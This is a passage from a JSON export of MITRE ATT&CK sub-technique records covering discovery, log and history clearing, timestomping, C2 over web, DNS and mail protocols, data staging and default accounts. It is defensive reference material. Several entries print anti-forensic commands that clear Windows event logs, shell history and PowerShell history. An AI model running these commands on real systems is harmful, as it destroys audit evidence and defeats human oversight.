    "technique_description": "<p>Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.<!-- raw HTML omitted --><!-- raw HTML omitted -->Commands such as <!-- raw HTML omitted -->net group /domain<!-- raw HTML omitted --> of the <a href=\"https://attack.mitre.org/software/S0039\">Net</a> utility,  <!-- raw HTML omitted -->dscacheutil -q group<!-- raw HTML omitted --> on macOS, and <!-- raw HTML omitted -->ldapsearch<!-- raw HTML omitted --> on Linux can list domain-level groups.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2",
    "platform": "office-365|azure-ad|gcp|saas|azure|aws",
    "tid": "T1069.003",
    "technique": "Cloud Groups",
    "tactic": "discovery",
    "datasources": "api-monitoring|aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|office-365-account-logs|process-command-line-parameters|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.<!-- raw HTML omitted --><!-- raw HTML omitted -->With authenticated access there are several tools that can be used to find permissions groups. The <!-- raw HTML omitted -->Get-MsolRole<!-- raw HTML omitted --> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.(Citation: Microsoft Msolrole)(Citation: GitHub Raindance)<!-- raw HTML omitted --><!-- raw HTML omitted -->Azure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command <!-- raw HTML omitted -->az ad user get-member-groups<!-- raw HTML omitted --> will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Msolrole",
        "url": "https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrole?view=azureadps-1.0",
        "description": "Microsoft. (n.d.). Get-MsolRole. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Raindance",
        "url": "https://github.com/True-Demon/raindance",
        "description": "Stringer, M.. (2018, November 21). RainDance. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AZ CLI",
        "url": "https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest",
        "description": "Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Black Hills Red Teaming MS AD Azure, 2018",
        "url": "https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/",
        "description": "Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active Directory Leaks via Azure. Retrieved October 6, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
    "platform": "windows",
    "tid": "T1070.001",
    "technique": "Clear Windows Event Logs",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer’s alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.<!-- raw HTML omitted --><!-- raw HTML omitted -->The event logs can be cleared with the following utility commands:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->wevtutil cl system<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->wevtutil cl application<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->wevtutil cl security<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->These logs may also be cleared through other mechanisms, such as the event viewer GUI or <a href=\"https://attack.mitre.org/techniques/T1059/001\">PowerShell</a>.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft wevtutil Oct 2017",
        "url": "https://docs.microsoft.com/windows-server/administration/windows-commands/wevtutil",
        "description": "Plett, C. et al.. (2017, October 16). wevtutil. Retrieved July 2, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft EventLog.Clear",
        "url": "https://msdn.microsoft.com/library/system.diagnostics.eventlog.clear.aspx",
        "description": "Microsoft. (n.d.). EventLog.Clear Method (). Retrieved July 2, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Clear-EventLog",
        "url": "https://docs.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog",
        "description": "Microsoft. (n.d.). Clear-EventLog. Retrieved July 2, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
    "platform": "linux|macos",
    "tid": "T1070.002",
    "technique": "Clear Linux or Mac System Logs",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <!-- raw HTML omitted -->/var/log/<!-- raw HTML omitted --> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->/var/log/messages:<!-- raw HTML omitted -->: General and system-related messages<!-- raw HTML omitted -->* <!-- raw HTML omitted -->/var/log/secure<!-- raw HTML omitted --> or <!-- raw HTML omitted -->/var/log/auth.log<!-- raw HTML omitted -->: Authentication logs<!-- raw HTML omitted -->* <!-- raw HTML omitted -->/var/log/utmp<!-- raw HTML omitted --> or <!-- raw HTML omitted -->/var/log/wtmp<!-- raw HTML omitted -->: Login records<!-- raw HTML omitted -->* <!-- raw HTML omitted -->/var/log/kern.log<!-- raw HTML omitted -->: Kernel logs<!-- raw HTML omitted -->* <!-- raw HTML omitted -->/var/log/cron.log<!-- raw HTML omitted -->: Crond logs<!-- raw HTML omitted -->* <!-- raw HTML omitted -->/var/log/maillog<!-- raw HTML omitted -->: Mail server logs<!-- raw HTML omitted -->* <!-- raw HTML omitted -->/var/log/httpd/<!-- raw HTML omitted -->: Web server access and error logs<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Linux Logs",
        "url": "https://www.eurovps.com/blog/important-linux-log-files-you-must-be-monitoring/",
        "description": "Marcel. (2018, April 19). 12 Critical Linux Log Files You Must be Monitoring. Retrieved March 29, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
    "platform": "linux|macos|windows",
    "tid": "T1070.003",
    "technique": "Clear Command History",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|file-monitoring|powershell-logs|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they’ve done.<!-- raw HTML omitted --><!-- raw HTML omitted -->On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <!-- raw HTML omitted -->HISTFILE<!-- raw HTML omitted -->. When a user logs off a system, this information is flushed to a file in the user’s home directory called <!-- raw HTML omitted -->~/.bash_history<!-- raw HTML omitted -->. The benefit of this is that it allows users to go back to commands they’ve used before in different sessions.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may delete their commands from these logs by manually clearing the history (<!-- raw HTML omitted -->history -c<!-- raw HTML omitted -->) or deleting the bash history file <!-- raw HTML omitted -->rm ~/.bash_history<!-- raw HTML omitted -->.<!-- raw HTML omitted --><!-- raw HTML omitted -->On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <!-- raw HTML omitted -->PSReadLine<!-- raw HTML omitted --> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.<!-- raw HTML omitted --><!-- raw HTML omitted -->The <!-- raw HTML omitted -->PSReadLine<!-- raw HTML omitted --> command history tracks the commands used in all PowerShell sessions and writes them to a file (<!-- raw HTML omitted -->$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt<!-- raw HTML omitted --> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may run the PowerShell command <!-- raw HTML omitted -->Clear-History<!-- raw HTML omitted --> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <!-- raw HTML omitted -->ConsoleHost_history.txt<!-- raw HTML omitted --> file. Adversaries may also delete the <!-- raw HTML omitted -->ConsoleHost_history.txt<!-- raw HTML omitted --> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft PowerShell Command History",
        "url": "https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7",
        "description": "Microsoft. (2020, May 13). About History. Retrieved September 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sophos PowerShell command audit",
        "url": "https://community.sophos.com/products/intercept/early-access-program/f/live-discover-response-queries/121529/live-discover---powershell-command-audit",
        "description": "jak. (2020, June 27). Live Discover - PowerShell command audit. Retrieved August 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Sophos PowerShell Command History Forensics",
        "url": "https://community.sophos.com/products/malware/b/blog/posts/powershell-command-history-forensics",
        "description": "Vikas, S. (2020, August 26). PowerShell Command History Forensics. Retrieved September 4, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c",
    "platform": "linux|macos|windows",
    "tid": "T1070.004",
    "technique": "File Deletion",
    "tactic": "defense-evasion",
    "datasources": "binary-file-metadata|file-monitoring|process-command-line-parameters",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary’s footprint.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)</p>\n",
    "technique_references": [
      {
        "source_name": "Trend Micro APT Attack Tools",
        "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/",
        "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a750a9f6-0bde-4bb3-9aae-1e2786e9780c",
    "platform": "windows",
    "tid": "T1070.005",
    "technique": "Network Share Connection Removal",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|packet-capture|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and <a href=\"https://attack.mitre.org/techniques/T1077\">Windows Admin Shares</a> connections can be removed when no longer needed. <a href=\"https://attack.mitre.org/software/S0039\">Net</a> is an example utility that can be used to remove network share connections with the <!-- raw HTML omitted -->net use \\system\\share /delete<!-- raw HTML omitted --> command. (Citation: Technet Net Use)</p>\n",
    "technique_references": [
      {
        "source_name": "Technet Net Use",
        "url": "https://technet.microsoft.com/bb490717.aspx",
        "description": "Microsoft. (n.d.). Net Use. Retrieved November 25, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611",
    "platform": "linux|macos|windows",
    "tid": "T1070.006",
    "technique": "Timestomp",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.<!-- raw HTML omitted --><!-- raw HTML omitted -->Timestomping may be used along with file name <a href=\"https://attack.mitre.org/techniques/T1036\">Masquerading</a> to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)</p>\n",
    "technique_references": [
      {
        "source_name": "WindowsIR Anti-Forensic Techniques",
        "url": "http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html",
        "description": "Carvey, H. (2013, July 23). HowTo: Determine/Detect the use of Anti-Forensics Techniques. Retrieved June 3, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
    "platform": "linux|macos|windows",
    "tid": "T1071.001",
    "technique": "Web Protocols",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <!-- raw HTML omitted --><!-- raw HTML omitted -->Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b",
    "platform": "linux|macos|windows",
    "tid": "T1071.002",
    "technique": "File Transfer Protocols",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <!-- raw HTML omitted --><!-- raw HTML omitted -->Protocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b",
    "platform": "linux|macos|windows",
    "tid": "T1071.003",
    "technique": "Mail Protocols",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <!-- raw HTML omitted --><!-- raw HTML omitted -->Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.</p>\n",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72",
    "platform": "linux|macos|windows",
    "tid": "T1071.004",
    "technique": "DNS",
    "tactic": "command-and-control",
    "datasources": "dns-records|netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. <!-- raw HTML omitted --><!-- raw HTML omitted -->The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)</p>\n",
    "technique_references": [
      {
        "source_name": "PAN DNS Tunneling",
        "url": "https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling",
        "description": "Palo Alto Networks. (n.d.). What Is DNS Tunneling?. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Medium DnsTunneling",
        "url": "https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000",
        "description": "Galobardes, R. (2018, October 30). Learn how easy is to bypass firewalls using DNS tunneling (and also how to block it). Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
    "platform": "linux|macos|windows",
    "tid": "T1074.001",
    "technique": "Local Data Staging",
    "tactic": "collection",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as <a href=\"https://attack.mitre.org/techniques/T1560\">Archive Collected Data</a>. Interactive command shells may be used, and common functionality within <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> and bash may be used to copy data into a staging location.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1074.002",
    "technique": "Remote Data Staging",
    "tactic": "collection",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as <a href=\"https://attack.mitre.org/techniques/T1560\">Archive Collected Data</a>. Interactive command shells may be used, and common functionality within <a href=\"https://attack.mitre.org/software/S0106\">cmd</a> and bash may be used to copy data into a staging location.<!-- raw HTML omitted --><!-- raw HTML omitted -->In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may <a href=\"https://attack.mitre.org/techniques/T1578/002\">Create Cloud Instance</a> and stage data in that instance.(Citation: Mandiant M-Trends 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M-Trends 2020",
        "url": "https://content.fireeye.com/m-trends/rpt-m-trends-2020",
        "description": "Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "defense-evasion",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.(Citation: Microsoft Local Accounts Feb 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a> or credential materials to legitimately connect to remote environments via <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a>.(Citation: Metasploit SSH Module)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "persistence",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.(Citation: Microsoft Local Accounts Feb 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a> or credential materials to legitimately connect to remote environments via <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a>.(Citation: Metasploit SSH Module)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "privilege-escalation",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems or default factory/provider set accounts on other types of systems, software, or devices.(Citation: Microsoft Local Accounts Feb 2019)<!-- raw HTML omitted --><!-- raw HTML omitted -->Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen <a href=\"https://attack.mitre.org/techniques/T1552/004\">Private Keys</a> or credential materials to legitimately connect to remote environments via <a href=\"https://attack.mitre.org/techniques/T1021\">Remote Services</a>.(Citation: Metasploit SSH Module)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/70.html",
        "description": "none",
        "external_id": "CAPEC-70"
      },
      {
        "source_name": "Microsoft Local Accounts Feb 2019",
        "url": "https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts",
        "description": "Microsoft. (2018, December 9). Local Accounts. Retrieved February 11, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Metasploit SSH Module",
        "url": "https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh",
        "description": "undefined. (n.d.). Retrieved April 12, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1078.001",
    "technique": "Default Accounts",
    "tactic": "initial-access",
    "datasources": "authentication-logs|aws-cloudtrail-logs|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
